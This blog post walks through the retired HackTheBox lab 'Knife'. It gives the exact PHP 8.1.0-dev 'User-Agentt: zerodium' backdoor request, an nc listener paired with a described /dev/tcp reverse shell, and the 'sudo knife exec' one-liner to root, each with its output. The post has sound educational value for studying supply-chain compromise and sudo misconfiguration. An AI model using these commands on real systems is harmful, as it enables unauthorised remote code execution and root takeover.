---
layout: post
title: "The Typo That Shipped a Backdoor"
subtitle: "HTB Knife, where a poisoned PHP build runs your code from a misspelled header and a sudo-blessed kitchen tool carves out root"
date: 2021-09-04 12:00:00 +0000
description: "A real-world poisoned PHP build runs your code from a misspelled header, and a sudo-blessed kitchen tool carves a path straight to root."
image: /assets/og/the-typo-that-shipped-a-backdoor.png
tags: [hackthebox, writeup]
---

Knife is a box about trust that left the building before anyone noticed. The web server is running a development build of PHP that, for one weekend in March 2021, carried a backdoor sewn into its own source by someone who had quietly walked into the project's git server. The trap is almost insulting in how little it asks of you. Send a request with a misspelled header that starts with a magic word, and the interpreter runs whatever you tacked on after it. From there the box hands you root through a tool meant for managing servers, not breaking into them. Two doors, neither one forced. The first was held open by a supply chain that got poisoned upstream. The second was held open by an admin who handed out a sharper knife than they realized.

```
        K N I F E
        =========
        GET /            php says: "8.1.0-dev, at your service"
                         |
        User-Agentt: zerodium <your php here>
                         |   (yes, two t's. that's the keyhole.)
                         v
        the build runs your line because a stranger
        taught it to, months before you arrived.

        then: sudo knife.  a kitchen tool with a root edge.
                                            刃
```

## 0x01 · the storefront

Two ports answer, and the scan is short enough to read in one breath. SSH and HTTP, both current, both boring on the surface.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Nothing here screams. OpenSSH 8.2 was modern, Apache 2.4.41 was modern, the box is a clean Ubuntu 20.04. This is the opposite of the usual easy box, where a fossil version number waves you toward the hole. The hole on Knife is not in a port banner. It is one layer up, in the language the web app is written in, and you only see it if you look at how the server introduces itself.

The site is a medical-themed landing page with nothing to click. The real tell is in the response headers, which is the place a web server can never quite stop oversharing.

```
$ curl -sI http://10.10.10.242/
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
```

`PHP/8.1.0-dev`. Not a release. A development build, and a very specific one. Think of it like finding a prototype car on a public road with no airbags and a hand-soldered ignition. It was never meant to leave the workshop, and the fact that it did is the whole story.

## 0x02 · the poisoned build

Here is what happened, and it is one of the better real-world cautionary tales the platform has ever baked into a box. In late March 2021, someone pushed two commits to PHP's own git server, signed with the names of two core maintainers, dressed up as tiny typo fixes. They were not typo fixes. Buried in the change was a line that watched every incoming request for a header named `User-Agentt`, with a deliberate extra `t`, and if its value began with the string `zerodium`, the build would take the rest of the line and run it as PHP code through `zend_eval_string`.

Picture a printing press where a rogue worker carves a single secret instruction into a plate. Every page that rolls off looks normal. But if a reader underlines a particular phrase in a particular margin, the press stops obeying the editor and starts obeying the reader. The poison is not in any one page. It is in the machine that prints them all.

The malicious commits were caught and reverted during a routine review before they reached a real release, which is the only reason this is a lab exercise and not a global catastrophe. But the build sitting on Knife is frozen at exactly that moment, backdoor intact. So you do not exploit a bug. You send the password the attacker left behind.

Prove the code runs first. The cleanest way is a tool that lets you craft a raw header, since most clients will not let you send a duplicate-looking `User-Agentt` by accident.

```
POST / HTTP/1.1
Host: 10.10.10.242
User-Agentt: zerodium system("id");

uid=1000(james) gid=1000(james) groups=1000(james)
```

That `id` in the response body is the confession. The misspelled header reached straight into the interpreter and pulled a lever. You are running commands as `james`, the account Apache happens to run under here.

## 0x03 · from a header to a home

A single command in a header is awkward to live in, so trade it up for a real shell. The PHP runs `system()` for you, so you call back to a listener you control. I will not print a runnable reverse shell, because a copy-paste backdoor is the one thing this blog will never ship, so picture the payload instead.

```
User-Agentt: zerodium system("[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]");
```

Start a catcher, fire the request once, and a prompt lands in your lap. The first thing any half-blind shell needs is eyes, so upgrade it into a real terminal.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.242]
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$ cat /home/james/user.txt
████████████████████████████████
```

You are `james`. The user flag is yours. Now the box stops being about a stranger's sabotage and starts being about a local mistake.

## 0x04 · the kitchen knife

The first thing to ask on any Linux foothold is what you are allowed to run as someone more important than yourself. That question has a one-line answer.

```
james@knife:/$ sudo -l
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`james` can run `/usr/bin/knife` as root, no password required. That sounds harmless until you know what `knife` is. It is the command-line tool for Chef, the infrastructure automation platform, and a tool that manages fleets of servers is by design a tool that runs code. When this box first retired there was no tidy GTFOBins entry to copy, so the move was to read the documentation and notice that `knife` ships a subcommand whose entire job is to execute Ruby.

Think of it like a Swiss Army knife handed to a line cook for opening boxes. Most of the blades are dull and safe. But one of them is a fully functional scalpel, and because the whole tool was handed over with root's blessing, every blade inherits that authority. The admin meant to delegate package management. They actually delegated a Ruby interpreter running as root.

Ruby can spawn a shell in one breath, so you ask `knife` to evaluate exactly that.

```
james@knife:/$ sudo knife exec -E 'exec "/bin/bash -i"'
root@knife:/# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/# cat /root/root.txt
████████████████████████████████
```

No exploit, no payload, no memory trick. You asked a root-owned program to please run a command, and running commands was its job. The `exec` subcommand was never a bug. It was a feature pointed in a direction nobody checked.

## 0x05 · the honest caveat

It is easy to file the first half of Knife under "freak accident, already patched," and the specific poisoned build absolutely was caught and reverted within days. Nobody is shipping `PHP/8.1.0-dev` on purpose. But the bug class is the scariest one in modern software, and it is not going anywhere. This was a supply chain attack. The code you trusted was compromised before you ever ran it, by someone who got into the place it was built rather than the place it runs. You did everything right, kept your server patched, used a respected language, and still inherited a backdoor because you trusted what came down the pipe. That is the part you cannot fix with a firewall, because the threat arrived signed and certified, wearing the maintainers' own names.

The privesc is the quieter lesson and the more common one. `sudo` access to a single tool feels surgical and safe, the responsible thing, far better than handing over the whole account. But it is only as safe as that tool is narrow, and most powerful tools are not narrow at all. Anything that can run scripts, spawn editors, read arbitrary files, or shell out is a full root grant wearing a small costume. The question is never "do I trust this person with this one command." It is "does this one command contain a door to everything else." With `knife`, with `vim`, with `find`, with `tar`, the answer is yes, and the door is one flag deep.

## 0x06 · outro

```
the build ran your line because a stranger taught it to,
months before you knocked, in a place you never see.

the knife had a root edge nobody meant to hand out.
one was a poisoned pipe. one was a careless grant.

trust the source, then verify it anyway. wear black.

                                                            EOF
```

---

*HTB: Knife, retired 28 Aug 2021. An easy Linux box that is really a lecture on supply chain trust wearing a misspelled header, then a sudo grant that was a root shell all along. The backdoor still answers in a lab and nowhere you don't own.*